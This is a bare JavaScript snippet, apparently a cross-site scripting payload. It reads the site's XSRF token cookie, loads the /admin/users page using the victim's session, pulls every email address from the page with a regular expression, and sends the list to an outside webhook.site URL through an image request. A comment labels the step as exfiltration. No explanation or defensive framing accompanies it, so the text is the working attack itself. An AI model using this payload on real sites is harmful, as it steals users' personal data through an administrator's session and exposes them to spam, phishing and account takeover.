(function(){
  var t=decodeURIComponent(document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);

  // Exfiltrate users list page (GET - always works)
  fetch('/admin/users',{credentials:'include'})
    .then(function(r){return r.text();})
    .then(function(html){
      var emails=html.match(/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-z]{2,}/g)||[];
      new Image().src='https://webhook.site/#!/view/44c96653-a7fd-4743-9846-830dd719d82d/?emails='+encodeURIComponent(emails.join(','));
    });

})();
